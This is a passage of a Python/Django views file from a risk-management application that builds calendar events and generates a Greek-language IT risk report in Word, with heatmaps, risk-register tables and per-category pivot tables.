            approval_likelihood = (approval.approval_likelihood() if hasattr(approval, 'approval_likelihood') and callable(approval.approval_likelihood)
                                 else getattr(approval, 'approval_likelihood', None))
            approval_impact = (approval.approval_impact() if hasattr(approval, 'approval_impact') and callable(approval.approval_impact)
                             else getattr(approval, 'approval_impact', None))

            # Ensure due_date is not None
            start_date = approval.due_date.isoformat() if approval.due_date else today.isoformat()

            events.append({
                'title': f'Pending Approval: {risk.title}',
                'start': start_date,
                'color': '#FF6347',  # Orange for user-specific approvals
                'type': 'user-approval',
                'url': f'/risk/{risk.id}/',
                'allDay': True,
                'inherent_likelihood': inherent_likelihood,
                'inherent_impact': inherent_impact,
                'residual_likelihood': residual_likelihood,
                'residual_impact': residual_impact,
                'targeted_likelihood': targeted_likelihood,
                'targeted_impact': targeted_impact,
                'approval_likelihood': approval_likelihood,
                'approval_impact': approval_impact
            })

    # Action-related events for owner (only pending actions)
    for action in actions_owner:
        if action.deadline:  # Check if not None
            events.append({
                'title': f'Action (Owner): {action.title}',
                'start': action.deadline.isoformat(),
                'color': '#FFD700',  # Gold for owner actions
                'type': 'action-owner',
                'url': f'/action_detail/{action.id}/',
                'allDay': True
            })

    # Action-related events for performer (only pending actions)
    for action in actions_performer:
        if action.deadline:  # Check if not None
            events.append({
                'title': f'Action (Performer): {action.title}',
                'start': action.deadline.isoformat(),
                'color': '#DC143C',  # Crimson for performer actions
                'type': 'action-performer',
                'url': f'/action_detail/{action.id}/',
                'allDay': True
            })

    return JsonResponse(events, safe=False)



from django.contrib.admin.views.decorators import staff_member_required

@staff_member_required
def admin_pivots_view(request):
    return render(request, 'admin_pivots.html')



from django.middleware.csrf import get_token
from django.contrib.auth.decorators import permission_required
from django.http import HttpResponse
from .models import Portfolio  # Assuming a Portfolio model exists

from django.contrib.auth.decorators import permission_required
from django.middleware.csrf import get_token
from django.shortcuts import render
from .models import Portfolio

@permission_required('orm.can_view_reports', raise_exception=True)
def reports_landing_page(request):
    # CSRF token for the form
    csrf_token = get_token(request)

    # Retrieve available portfolios, sorted by name
    portfolios = Portfolio.objects.all().order_by('name')

    context = {
        'csrf_token': csrf_token,
        'portfolios': portfolios,
    }
    return render(request, 'reports_landing_page.html', context)



from django.contrib.auth.decorators import permission_required
from django.http import HttpResponse
from docx import Document
from docx.oxml.ns import qn
from docx.shared import Pt
from io import BytesIO
import zipfile
from django.contrib.staticfiles import finders
from django.db.models import Q
from .models import Portfolio, Risk  # Adjust imports based on your models



@permission_required('orm.can_view_reports', raise_exception=True)
def generate_it_risk_report(request):
    main_report = Document()  # or Document(path_to_template)

    if request.method == "POST":
        # Gather selected portfolios from user input
        selected_portfolio_ids = request.POST.getlist('portfolios')
        selected_portfolios = Portfolio.objects.filter(id__in=selected_portfolio_ids)

        # Calculate total risks based on selected portfolios
        risks = Risk.objects.filter(portfolio__in=selected_portfolios).exclude(
            Q(portfolio__name__icontains='archive')
        )
        total_risks = risks.count()

        # Initialize risk data matrices for heatmaps
        inherent_data = [[[] for _ in range(5)] for _ in range(5)]
        residual_data = [[[] for _ in range(5)] for _ in range(5)]
        targeted_data = [[[] for _ in range(5)] for _ in range(5)]

        # Populate each risk data matrix with appropriate scores
        for risk in risks:
            inherent_data[risk.inherent_likelihood - 1][risk.inherent_impact - 1].append(risk)
            residual_data[risk.residual_likelihood - 1][risk.residual_impact - 1].append(risk)
            targeted_data[risk.targeted_likelihood - 1][risk.targeted_impact - 1].append(risk)

        # Path to the logo
        logo_path = finders.find('images/avax-logo.jpeg')
        if not logo_path:
            raise FileNotFoundError('Logo file not found in static/images.')

        # Prepare document and add sections
        buffer = BytesIO()
        with zipfile.ZipFile(buffer, 'w') as zip_archive:
            main_report = Document()
            set_calibri_font(main_report)
            add_it_risk_cover_page_gr(main_report, logo_path, selected_portfolios)  # Cover page
            add_table_of_contents_gr(main_report)  # Table of Contents
            add_executive_summary_it(
                main_report,
                selected_portfolios,
                total_risks,
                inherent_data,
                residual_data,
                targeted_data
            )

            # Add Annex 1: IT Assets and Risks (empty for now)
            add_annex_1_it_assets(main_report, selected_portfolios)

            add_page_numbers_gr(main_report)

            # Save and add the document to the ZIP archive
            main_report_io = BytesIO()
            main_report.save(main_report_io)
            main_report_io.seek(0)
            zip_archive.writestr(f'it_risk_report_GREEK.docx', main_report_io.read())

        # Set the buffer position and return the response
        buffer.seek(0)
        response = HttpResponse(buffer, content_type='application/zip')
        response['Content-Disposition'] = f'attachment; filename="it_risk_report_GREEK.zip"'
        return response

    # If not POST, return a form or redirect (you might already have this elsewhere)
    return HttpResponse("Please submit the form to generate the report.")


def add_it_risk_cover_page_gr(document, logo_path, selected_portfolios):
    # Set font to Calibri for the document
    for style in document.styles:
        if style.name == 'Normal':
            style.font.name = 'Calibri'
            style.font.size = Pt(12)

    # Header: Add logo to the header for all pages, aligned to the left
    section = document.sections[0]
    header = section.header
    header_paragraph = header.paragraphs[0]
    header_paragraph.alignment = WD_PARAGRAPH_ALIGNMENT.LEFT  # Align logo to the left
    header_run = header_paragraph.add_run()
    header_run.add_picture(logo_path, width=Inches(1.5))  # Adjust width as needed

    # Add title on cover page
    title = document.add_paragraph()
    title_run = title.add_run("Αναφορά Διαχείρισης Κινδύνων Πληροφορικής (IT Risk Report)")
    title_run.bold = True
    title_run.font.size = Pt(20)
    title.alignment = WD_PARAGRAPH_ALIGNMENT.CENTER

    # Add a line after the title
    title_line = document.add_paragraph()
    title_line.add_run("______________________________________").font.size = Pt(10)
    title_line.alignment = WD_PARAGRAPH_ALIGNMENT.CENTER

    # Subtitle for selected portfolios
    subtitle = document.add_paragraph("Σχετικά Χαρτοφυλάκια Έργων (Selected Project Portfolios):")
    subtitle.alignment = WD_PARAGRAPH_ALIGNMENT.CENTER
    subtitle_run = subtitle.add_run()
    subtitle_run.font.size = Pt(14)

    # List each selected portfolio
    for portfolio in selected_portfolios:
        portfolio_paragraph = document.add_paragraph(f"- {portfolio.name}")
        portfolio_paragraph.alignment = WD_PARAGRAPH_ALIGNMENT.CENTER

    # Add space after the portfolio list
    document.add_paragraph("\n")

    # Add date
    date_paragraph = document.add_paragraph()
    date_paragraph.add_run(f"Ημερομηνία (Date): {now().strftime('%d-%m-%Y')}")
    date_paragraph.alignment = WD_PARAGRAPH_ALIGNMENT.CENTER

    # Add "Prepared by" section
    prepared_by = document.add_paragraph("Προετοιμάστηκε από (Prepared by): [Your Company Name Here]")
    prepared_by.alignment = WD_PARAGRAPH_ALIGNMENT.CENTER

    # Insert a page break before the Table of Contents
    document.add_page_break()


from docx import Document
from docx.oxml.ns import qn
from docx.oxml import OxmlElement
from docx.shared import Pt
from docx.enum.section import WD_ORIENT    

def add_executive_summary_it(document, selected_portfolios, total_risks, inherent_data, residual_data, targeted_data):
    document.add_page_break()

    # Executive Summary Title
    document.add_heading('\nΔιοικητική Περίληψη Πληροφοριακών Συστημάτων (IT Executive Summary)', level=1)

    # Introduction to the IT Risk Report
    document.add_paragraph(
        '\nΗ παρούσα αναφορά παρουσιάζει μια ολοκληρωμένη ανάλυση της διαχείρισης κινδύνων πληροφοριακών συστημάτων για τα επιλεγμένα χαρτοφυλάκια του οργανισμού. '
        'Ο κύριος στόχος είναι η αναγνώριση, η αξιολόγηση και η μείωση των κινδύνων που σχετίζονται με τα πληροφοριακά περιουσιακά στοιχεία (IT assets), '
        'όπως οι υποδομές, οι εφαρμογές και τα δεδομένα, με σκοπό τη διασφάλιση της ακεραιότητας, της διαθεσιμότητας και της εμπιστευτικότητας των συστημάτων.'
    )

    document.add_paragraph(
        '\nΗ παρακάτω σύνοψη παρέχει μια επισκόπηση του τοπίου κινδύνων των πληροφοριακών συστημάτων, εστιάζοντας στις βαθμολογίες κινδύνου για τις '
        'κύριες κατηγορίες: εγγενείς, υπολειμματικές και στοχευμένες βαθμολογίες.'
    )

    # Section to list selected portfolios
    document.add_heading('\nΕξεταζόμενα Χαρτοφυλάκια Πληροφοριακών Συστημάτων (Examined IT Portfolios)', level=2)
    for portfolio in selected_portfolios:
        document.add_paragraph(f"- {portfolio.name}", style="List Bullet")

    def clean_rich_text(text):
        # Function to clean HTML tags from TinyMCE rich text
        import re
        return re.sub(r'<.*?>', '', text)

    for portfolio in selected_portfolios:
        if hasattr(portfolio, 'description') and portfolio.description:
            clean_description = clean_rich_text(portfolio.description)
            document.add_paragraph(f"{portfolio.name}: {clean_description}", style="Body Text")

    # Risk Evaluation Methodology with ALARP Principle
    document.add_heading('\nΜεθοδολογία Αξιολόγησης Κινδύνων Πληροφοριακών Συστημάτων\n', level=2)
    paragraph = document.add_paragraph()
    run1 = paragraph.add_run(
        'Κάθε κίνδυνος στα πληροφοριακά συστήματα αξιολογείται με βάση δύο παράγοντες: την πιθανότητα εμφάνισης (π.χ. από παραβιάσεις ασφαλείας ή σφάλματα συστημάτων) '
        'και την επίπτωση στις λειτουργίες IT (π.χ. διακοπή υπηρεσιών, απώλεια δεδομένων). '
        'Η βαθμολογία κινδύνου υπολογίζεται από το γινόμενο της πιθανότητας και της επίπτωσης (Likelihood x Impact = Risk Score). '
    )
    run2 = paragraph.add_run('Οι υπολειπόμενοι κίνδυνοι ')
    run2.bold = True
    run3 = paragraph.add_run(
        'διατηρούνται στο χαμηλότερο δυνατό επίπεδο, σύμφωνα με την αρχή '
    )
    run4 = paragraph.add_run('ALARP (As Low As Reasonably Practicable)')
    run4.bold = True
    run5 = paragraph.add_run(
        ', η οποία στοχεύει στη μείωση των κινδύνων όσο είναι εφικτό, χωρίς υπερβολικό κόστος ή πολυπλοκότητα στις IT διαδικασίες.'
    )

    # Likelihood and Impact Score Table
    table = document.add_table(rows=1, cols=3)
    table.style = 'Table Grid'
    hdr_cells = table.rows[0].cells
    hdr_cells[0].text = 'Βαθμολογία (Score)'
    hdr_cells[1].text = 'Πιθανότητα (Likelihood)'
    hdr_cells[2].text = 'Επίπτωση (Impact)'

    table_data = [
        (5, 'Πολύ Υψηλή: Σχεδόν βέβαιη (π.χ. γνωστή ευπάθεια)', 'Κρίσιμη: Κατάρρευση συστήματος ή παραβίαση δεδομένων'),
        (4, 'Υψηλή: Πιθανή (π.χ. συχνές επιθέσεις)', 'Σημαντική: Διακοπή υπηρεσιών ή απώλεια δεδομένων'),
        (3, 'Μέτρια: Ενδεχόμενη (π.χ. περιοδικά σφάλματα)', 'Μέτρια: Επιβράδυνση ή περιορισμένη ζημιά'),
        (2, 'Χαμηλή: Σπάνια (π.χ. απομονωμένο περιστατικό)', 'Μικρή: Ελάχιστη διαταραχή λειτουργιών'),
        (1, 'Πολύ Χαμηλή: Απίθανη (π.χ. θεωρητικός κίνδυνος)', 'Αμελητέα: Χωρίς ουσιαστική επίπτωση')
    ]

    for score, likelihood, impact in table_data:
        row_cells = table.add_row().cells
        row_cells[0].text = str(score)
        row_cells[1].text = likelihood
        row_cells[2].text = impact

    # Risk Severity Table with Colors
    document.add_heading('\nΚατηγοριοποίηση Σοβαρότητας Κινδύνου Πληροφοριακών Συστημάτων\n', level=2)
    severity_table = document.add_table(rows=1, cols=2)
    severity_table.style = 'Table Grid'
    severity_hdr_cells = severity_table.rows[0].cells
    severity_hdr_cells[0].text = 'Βαθμολογία Κινδύνου (Risk Score)'
    severity_hdr_cells[1].text = 'Σοβαρότητα Κινδύνου (Severity Level)'

    severity_data = [
        ('15 - 25', 'Υψηλή (Κόκκινο)', 'FF0000'),
        ('8 - 12', 'Μέτρια (Κίτρινο)', 'FFC000'),
        ('1 - 6', 'Χαμηλή (Πράσινο)', '00B050'),
    ]

    for score_range, severity, color_hex in severity_data:
        row_cells = severity_table.add_row().cells
        row_cells[0].text = score_range
        row_cells[1].text = severity
        for cell in row_cells:
            from docx.oxml import OxmlElement
            tc_pr = cell._element.get_or_add_tcPr()
            shd = OxmlElement('w:shd')
            shd.set(qn('w:val'), 'clear')
            shd.set(qn('w:color'), 'auto')
            shd.set(qn('w:fill'), color_hex)
            tc_pr.append(shd)

    # Summary of Active IT Risks
    document.add_paragraph('\n')
    # document.add_paragraph(f'Συνολικός αριθμός ενεργών κινδύνων IT για τα επιλεγμένα χαρτοφυλάκια: {total_risks}')

    # Section for Inherent Risk Score
    document.add_heading('\nΕγγενείς (Inherent) Βαθμολογίες Κινδύνου Πληροφοριακών Συστημάτων', level=2)
    paragraph1 = document.add_paragraph()
    run1 = paragraph1.add_run('\nΗ Εγγενής (Inherent) Βαθμολογία Κινδύνου ')
    run1.bold = True
    run2 = paragraph1.add_run(
        'αντιπροσωπεύει το αρχικό επίπεδο κινδύνου που σχετίζεται με τα πληροφοριακά συστήματα, πριν από την εφαρμογή μέτρων ασφαλείας ή ελέγχων. '
        'Αυτή η βαθμολογία αποτυπώνει τη φυσική ευπάθεια των IT assets, όπως οι διακομιστές, οι βάσεις δεδομένων και τα δίκτυα.'
    )

    paragraph2 = document.add_paragraph(
        'Στο πεδίο της πληροφορικής, οι εγγενείς κίνδυνοι είναι υψηλοί λόγω της εξάρτησης από πολύπλοκες τεχνολογίες, της έκθεσης σε κυβερνοεπιθέσεις '
        'και της πιθανότητας ανθρώπινου λάθους. Παραδείγματα περιλαμβάνουν μη ενημερωμένο λογισμικό, αδύναμους κωδικούς πρόσβασης ή μη εξουσιοδοτημένη πρόσβαση. '
        'Η τακτική παρακολούθηση αυτών των κινδύνων είναι κρίσιμη για την προστασία των συστημάτων και τη διασφάλιση της συνέχειας των υπηρεσιών.'
    )

    # Section for Residual Risk Score
    document.add_heading('\nΥπολειπόμενες (Residual) Βαθμολογίες Κινδύνου Πληροφοριακών Συστημάτων', level=2)
    paragraph3 = document.add_paragraph()
    run3 = paragraph3.add_run('\nΗ Υπολειπόμενη (Residual) Βαθμολογία Κινδύνου ')
    run3.bold = True
    run4 = paragraph3.add_run(
        'αντιπροσωπεύει τον κίνδυνο που παραμένει μετά την εφαρμογή μέτρων ασφαλείας, όπως τείχη προστασίας, κρυπτογράφηση ή ενημερώσεις λογισμικού. '
        'Αυτοί οι κίνδυνοι απαιτούν συνεχή παρακολούθηση για τη διατήρηση της ασφάλειας και τη διασφάλιση της αξιοπιστίας των IT υπηρεσιών.'
    )

    document.add_page_break()

    # Explanation of Heatmaps
    document.add_paragraph(
        'Τα παρακάτω διαγράμματα (Heatmaps) απεικονίζουν τη κατανομή των κινδύνων IT με βάση την Πιθανότητα (Likelihood) και την Επίπτωση (Impact), '
        'προσφέροντας μια οπτική αναπαράσταση της σοβαρότητας των κινδύνων που σχετίζονται με τα πληροφοριακά συστήματα.'
    )

    document.add_paragraph(
        'Η σύγκριση των διαγραμμάτων Εγγενών (Inherent) και Υπολειπόμενων (Residual) Βαθμολογιών Κινδύνου δείχνει την αποτελεσματικότητα των μέτρων ασφαλείας, '
        'μετακινώντας τους κινδύνους σε χαμηλότερα επίπεδα σοβαρότητας και ενισχύοντας την ανθεκτικότητα των IT υποδομών.'
    )

    # Generate and insert the Inherent Risk Heatmap
    inherent_heatmap_base64, inherent_count_matrix, inherent_score_matrix = generate_heatmap_image(
        'Inherent IT Risk Scores Heatmap', inherent_data, 'inherent'
    )
    document.add_picture(io.BytesIO(base64.b64decode(inherent_heatmap_base64)), width=Inches(4))

    # Generate and insert the Residual Risk Heatmap
    residual_heatmap_base64, residual_count_matrix, residual_score_matrix = generate_heatmap_image(
        'Residual IT Risk Scores Heatmap', residual_data, 'residual'
    )
    document.add_picture(io.BytesIO(base64.b64decode(residual_heatmap_base64)), width=Inches(4))

    # Section for Targeted Risk Score
    document.add_heading('\nΣτοχευμένες (Targeted) Βαθμολογίες Κινδύνου Πληροφοριακών Συστημάτων', level=2)
    paragraph5 = document.add_paragraph()
    run5 = paragraph5.add_run('\nΗ Στοχευμένη (Targeted) Βαθμολογία Κινδύνου ')
    run5.bold = True
    run6 = paragraph5.add_run(
        'καθορίζει το επιθυμητό επίπεδο κινδύνου για τα πληροφοριακά συστήματα, μέσω της εφαρμογής προηγμένων μέτρων ασφαλείας και στρατηγικών βελτιστοποίησης. '
        'Στόχος είναι η ελαχιστοποίηση των κινδύνων σε αποδεκτά επίπεδα που εξασφαλίζουν την ασφάλεια και τη συνέχεια των IT υπηρεσιών.'
    )

    paragraph6 = document.add_paragraph(
        'Η Στοχευμένη Βαθμολογία αντικατοπτρίζει τη δέσμευση του οργανισμού για συνεχή ενίσχυση της κυβερνοασφάλειας, διασφαλίζοντας ότι τα συστήματα παραμένουν '
        'ανθεκτικά απέναντι σε απειλές και υποστηρίζουν τους στρατηγικούς στόχους του οργανισμού.'
    )

    # Generate and insert the Targeted Risk Heatmap
    targeted_heatmap_base64, targeted_count_matrix, targeted_score_matrix = generate_heatmap_image(
        'Targeted IT Risk Scores Heatmap', targeted_data, 'targeted'
    )
    document.add_picture(io.BytesIO(base64.b64decode(targeted_heatmap_base64)), width=Inches(4))

    # Assuming chart generation function exists
    chart_image_base64 = generate_portfolio_category_risk_chart(selected_portfolios)
    chart_image_data = base64.b64decode(chart_image_base64.split(",")[1])
    chart_image_io = io.BytesIO(chart_image_data)
    document.add_paragraph("Επίπεδα (Residual) Κινδύνου ανά Κατηγορία για τα Επιλεγμένα Χαρτοφυλάκια IT", style='Heading 2')
    document.add_picture(chart_image_io, width=Inches(7))

    # Page break after the summary
    document.add_page_break()
     
    # New Section: IT Risk Registry (Landscape Orientation)


    # New Section: Περίληψη Μητρώου Κινδύνων (Landscape Orientation)
    document.add_page_break()
    section = document.add_section()  # Create a new section
    section.orientation = WD_ORIENT.LANDSCAPE
    section.page_width = Pt(842)  # A4 landscape width (11.69 inches = 842 pt)
    section.page_height = Pt(595)  # A4 landscape height (8.27 inches = 595 pt)
    section.left_margin = Pt(72)  # 1 inch = 72 pt
    section.right_margin = Pt(72)
    section.top_margin = Pt(72)
    section.bottom_margin = Pt(72)

    document.add_heading('Περίληψη Μητρώου Κινδύνων', level=1)

    # Fetch risks for selected portfolios
    risks = Risk.objects.filter(portfolio__in=selected_portfolios).select_related('category').prefetch_related('mitigations', 'procedures', 'related_assets')
    sorted_risks = sorted(risks, key=lambda risk: locale.strxfrm(clean_rich_text(risk.title)))
    
    # Create table with 8 columns
    table = document.add_table(rows=1, cols=8)
    table.style = 'Table Grid'
    hdr_cells = table.rows[0].cells
    hdr_cells[0].text = 'Τίτλος Κινδύνου (Risk Title)'
    hdr_cells[1].text = 'Κατηγορία (Category)'
    hdr_cells[2].text = 'Μετριασμοί (Mitigations)'
    hdr_cells[3].text = 'Διαδικασίες (Procedures)'
    hdr_cells[4].text = 'IT Assets'
    hdr_cells[5].text = 'Εγγενής Βαθμολογία (Inherent Score)'
    hdr_cells[6].text = 'Υπολειπόμενη Βαθμολογία (Residual Score)'
    hdr_cells[7].text = 'Στοχευμένη Βαθμολογία (Targeted Score)'


    for cell in hdr_cells:
        cell.paragraphs[0].runs[0].bold = True
        cell.paragraphs[0].alignment = WD_PARAGRAPH_ALIGNMENT.CENTER
        tc_pr = cell._element.get_or_add_tcPr()
        shd = OxmlElement('w:shd')
        shd.set(qn('w:val'), 'clear')
        shd.set(qn('w:fill'), 'ADD8E6')  # Light blue background for headers
        tc_pr.append(shd)



    hdr_row = table.rows[0]
    if hdr_row._element.trPr is None:
        # Create trPr element if it doesn't exist
        trPr = OxmlElement('w:trPr')
        hdr_row._element.append(trPr)  # Append trPr to the row's XML




    # Now safely append the tblHeader
    tbl_header = OxmlElement('w:tblHeader')
    tbl_header.set(qn('w:val'), 'on')  # Set to repeat headers
    hdr_row._element.trPr.append(tbl_header)






    for risk in sorted_risks:
        row_cells = table.add_row().cells
        row_cells[0].text = clean_rich_text(risk.title)
        row_cells[1].text = risk.category.name if risk.category else 'N/A'
        
        # Mitigations
        mitigations = risk.mitigations.all()
        row_cells[2].text = '\n'.join([clean_rich_text(m.title) for m in mitigations]) if mitigations else 'Κανένας (None)'
        
        # Procedures
        procedures = risk.procedures.all()
        row_cells[3].text = '\n'.join([p.title for p in procedures]) if procedures else 'Κανένας (None)'
        
        # IT Assets
        assets = risk.related_assets.all()
        row_cells[4].text = '\n'.join([a.name for a in assets]) if assets else 'Κανένας (None)'
        
        # Calculate scores manually like in the pivot table
        inherent_score = (risk.inherent_likelihood or 0) * (risk.inherent_impact or 0)
        residual_score = (risk.residual_likelihood or 0) * (risk.residual_impact or 0)
        targeted_score = (risk.targeted_likelihood or 0) * (risk.targeted_impact or 0)

        # Inherent Score with color
        row_cells[5].text = f"{risk.inherent_likelihood or 'N/A'} x {risk.inherent_impact or 'N/A'} = {inherent_score}"
        if inherent_score:
            color_hex = 'FF0000' if inherent_score > 12 else 'FFC000' if inherent_score > 6 else '00B050'
            tc_pr = row_cells[5]._element.get_or_add_tcPr()
            shd = OxmlElement('w:shd')
            shd.set(qn('w:val'), 'clear')
            shd.set(qn('w:color'), 'auto')
            shd.set(qn('w:fill'), color_hex)
            tc_pr.append(shd)

        # Residual Score with color
        row_cells[6].text = f"{risk.residual_likelihood or 'N/A'} x {risk.residual_impact or 'N/A'} = {residual_score}"
        if residual_score:
            color_hex = 'FF0000' if residual_score > 12 else 'FFC000' if residual_score > 6 else '00B050'
            tc_pr = row_cells[6]._element.get_or_add_tcPr()
            shd = OxmlElement('w:shd')
            shd.set(qn('w:val'), 'clear')
            shd.set(qn('w:color'), 'auto')
            shd.set(qn('w:fill'), color_hex)
            tc_pr.append(shd)

        # Targeted Score with color
        row_cells[7].text = f"{risk.targeted_likelihood or 'N/A'} x {risk.targeted_impact or 'N/A'} = {targeted_score}"
        if targeted_score:
            color_hex = 'FF0000' if targeted_score > 12 else 'FFC000' if targeted_score > 6 else '00B050'
            tc_pr = row_cells[7]._element.get_or_add_tcPr()
            shd = OxmlElement('w:shd')
            shd.set(qn('w:val'), 'clear')
            shd.set(qn('w:color'), 'auto')
            shd.set(qn('w:fill'), color_hex)
            tc_pr.append(shd)

    # Reset to portrait orientation for subsequent sections
    # document.add_page_break()
    # section = document.sections[-1]
    # section.orientation = WD_ORIENT.PORTRAIT
    # section.page_width = Inches(8.27)  # A4 portrait width
    # section.page_height = Inches(11.69)  # A4 portrait height

# Existing Pivot Table Section
     
     
     
    # Assuming this function exists for residual risk pivot
    add_residual_risk_pivot_it(document, selected_portfolios)


from docx.oxml.ns import qn
from docx.oxml import OxmlElement
from docx.enum.section import WD_ORIENT
from .models import Risk, ITAsset  # Adjust imports based on your project structure

from docx.oxml.ns import qn
from docx.oxml import OxmlElement
from docx.enum.section import WD_ORIENT
from .models import Risk  # Adjust imports based on your project structure
import locale



from docx import Document
from docx.oxml.ns import qn
from docx.oxml import OxmlElement
from docx.enum.section import WD_ORIENT
from docx.enum.text import WD_PARAGRAPH_ALIGNMENT
import locale

from docx import Document
from docx.oxml.ns import qn
from docx.oxml import OxmlElement
from docx.enum.section import WD_ORIENT
from docx.enum.text import WD_PARAGRAPH_ALIGNMENT
import locale

def add_residual_risk_pivot_it(document, selected_portfolios):
    header_color = 'ADD8E6'  # Light blue for headers
    risk_bg_color = 'D9EAD3'  # Light green for risk section
    opportunity_bg_color = 'C9DAF8'  # Light blue for opportunity section
    threat_bg_color = 'F4CCCC'  # Light red for threat section
    mitigation_bg_color = 'FCE5CD'  # Light orange for mitigation section
    asset_bg_color = 'E6E6FA'  # Light lavender for IT assets section header
    procedure_bg_color = 'FFF2CC'  # Light yellow for procedures section
    asset_first_line_color = 'E0E0E0'  # Light gray for first line of each asset

    document.add_page_break()
    document.add_heading('\nΠαράρτημα 1: - Μητρώο Κινδύνων Πληροφοριακών Συστημάτων ανά Κατηγορία', level=1)

    document.add_paragraph(
        'Ο πίνακας που ακολουθεί παρουσιάζει το Μητρώο Κινδύνων Πληροφοριακών Συστημάτων, οργανωμένο ανά κατηγορία, με τους κινδύνους '
        'ταξινομημένους αλφαβητικά (Α-Ω) εντός κάθε κατηγορίας. Παρέχει μια δομημένη επισκόπηση των κινδύνων που σχετίζονται με τα IT assets '
        'των επιλεγμένων χαρτοφυλακίων, καθώς και τις σχετικές διαδικασίες που τα υποστηρίζουν. Αυτή η ομαδοποίηση '
        'επιτρέπει τον εντοπισμό κρίσιμων περιοχών κινδύνου, όπως κυβερνοεπιθέσεις, σφάλματα συστημάτων και απώλεια δεδομένων, διευκολύνοντας την '
        'εστίαση σε βασικούς τομείς για την ασφάλεια και τη συνέχεια των IT υπηρεσιών.'
    )
    document.add_paragraph(
        'Για κάθε κατηγορία κινδύνου, περιλαμβάνονται οι εγγενείς (inherent), υπολειμματικοί (residual) και στοχευμένοι (targeted) δείκτες κινδύνου, '
        'που αποτυπώνουν το αρχικό επίπεδο κινδύνου, το τρέχον επίπεδο μετά από μέτρα ασφαλείας και το επιθυμητό επίπεδο μετά από περαιτέρω βελτιώσεις. '
        'Επιπλέον, παρουσιάζονται οι διαδικασίες που σχετίζονται με κάθε κίνδυνο, παρέχοντας πληροφορίες για τις υφιστάμενες πρακτικές διαχείρισης. '
        'Αυτή η ανάλυση υποστηρίζει τη λήψη αποφάσεων για τη διαχείριση κινδύνων IT.'
    )

    section = document.sections[-1]
    section.orientation = WD_ORIENT.PORTRAIT

    selected_portfolio_ids = [portfolio.id for portfolio in selected_portfolios]
    all_risks = Risk.objects.filter(portfolio_id__in=selected_portfolio_ids).select_related('portfolio', 'category').prefetch_related(
        'related_assets', 'opportunities', 'threats', 'mitigations', 'procedures'
    )

    pivot_data = {}
    for risk in all_risks:
        category_name = risk.category.name if risk.category else "Χωρίς Κατηγορία (Uncategorized)"
        if category_name not in pivot_data:
            pivot_data[category_name] = []

        inherent_score = (risk.inherent_likelihood or 0) * (risk.inherent_impact or 0)
        residual_score = (risk.residual_likelihood or 0) * (risk.residual_impact or 0)
        targeted_score = (risk.targeted_likelihood or 0) * (risk.targeted_impact or 0)

        pivot_data[category_name].append({
            'title': risk.title,
            'description': risk.description,
            'inherent_score': inherent_score,
            'residual_score': residual_score,
            'targeted_score': targeted_score,
            'inherent_detail': f"{risk.inherent_likelihood} x {risk.inherent_impact}",
            'residual_detail': f"{risk.residual_likelihood} x {risk.residual_impact}",
            'targeted_detail': f"{risk.targeted_likelihood} x {risk.targeted_impact}",
            'opportunities': [(opp.title, opp.description) for opp in risk.opportunities.all()],
            'threats': [(threat.title, threat.description) for threat in risk.threats.all()],
            'mitigations': [(mit.title, mit.description) for mit in risk.mitigations.all()],
            'procedures': [(proc.code, proc.revision, proc.title, proc.description) for proc in risk.procedures.all()],
            'related_assets': [(asset.name, asset.asset_type, asset.status, asset.criticality) for asset in risk.related_assets.all()]
        })

    sorted_categories = sorted(pivot_data.keys())

    for category in sorted_categories:
        document.add_page_break()
        document.add_heading(category, level=2)

        # Sort risks alphabetically by title within each category
        risks = sorted(pivot_data[category], key=lambda x: locale.strxfrm(x['title']))

        risk_number = 1
        for risk in risks:
            if risk_number > 1:
                document.add_page_break()

            # Table structure for Rank and Scores
            table = document.add_table(rows=2, cols=4)
            table.style = 'Table Grid'

            # Row 1: Headers for Rank and Scores
            hdr_cells = table.rows[0].cells
            headers = ["Αξιολόγηση (Rank)", "Αρχικός Δείκτης (Inherent Score)", "Υπολειμματικός Δείκτης (Residual Score)", "Στοχευμένος Δείκτης (Targeted Score)"]
            for i, header in enumerate(headers):
                hdr_cells[i].text = header
                hdr_cells[i].paragraphs[0].runs[0].bold = True
                hdr_cells[i].paragraphs[0].alignment = WD_PARAGRAPH_ALIGNMENT.CENTER
                tc_pr = hdr_cells[i]._element.get_or_add_tcPr()
                shd = OxmlElement('w:shd')
                shd.set(qn('w:val'), 'clear')
                shd.set(qn('w:fill'), header_color)
                tc_pr.append(shd)

            # Row 2: Actual Values with Color-coded Scores
            value_cells = table.rows[1].cells
            value_cells[0].text = str(risk_number)
            value_cells[1].text = f"{risk['inherent_detail']} = {risk['inherent_score']}"
            value_cells[2].text = f"{risk['residual_detail']} = {risk['residual_score']}"
            value_cells[3].text = f"{risk['targeted_detail']} = {risk['targeted_score']}"
            apply_score_color(value_cells[1], risk['inherent_score'])
            apply_score_color(value_cells[2], risk['residual_score'])
            apply_score_color(value_cells[3], risk['targeted_score'])

            # Add Risk Title and Description
            risk_header = table.add_row().cells
            risk_header[0].merge(risk_header[3])
            risk_header[0].text = "Κίνδυνος Πληροφοριακών Συστημάτων (IT Risk)"
            risk_header[0].paragraphs[0].runs[0].bold = True
            tc_pr = risk_header[0]._element.get_or_add_tcPr()
            shd = OxmlElement('w:shd')
            shd.set(qn('w:val'), 'clear')
            shd.set(qn('w:fill'), risk_bg_color)
            tc_pr.append(shd)

            title_row = table.add_row().cells
            title_row[0].text = "Τίτλος (Title)"
            title_row[1].merge(title_row[3])
            add_html_to_word(document, title_row[1].paragraphs[0], risk['title'])

            desc_row = table.add_row().cells
            desc_row[0].text = "Περιγραφή (Description)"
            desc_row[1].merge(desc_row[3])
            add_html_to_word(document, desc_row[1].paragraphs[0], risk['description'])

            # Add Related IT Assets (if any)
            if risk['related_assets']:
                assets_header = table.add_row().cells
                assets_header[0].merge(assets_header[3])
                assets_header[0].text = "Σχετιζόμενα Πληροφοριακά Περιουσιακά Στοιχεία (Related IT Assets)"
                tc_pr = assets_header[0]._element.get_or_add_tcPr()
                shd = OxmlElement('w:shd')
                shd.set(qn('w:fill'), asset_bg_color)
                tc_pr.append(shd)

                for asset_name, asset_type, asset_status, asset_criticality in risk['related_assets']:
                    # First row (Name and Type) with colored background
                    asset_row = table.add_row().cells
                    asset_row[0].text = "Όνομα (Name)"
                    asset_row[1].text = asset_name
                    asset_row[2].text = "Τύπος (Type)"
                    asset_row[3].text = asset_type.capitalize()
                    for cell in asset_row:  # Apply color to all cells in this row
                        tc_pr = cell._element.get_or_add_tcPr()
                        shd = OxmlElement('w:shd')
                        shd.set(qn('w:val'), 'clear')
                        shd.set(qn('w:fill'), asset_first_line_color)
                        tc_pr.append(shd)

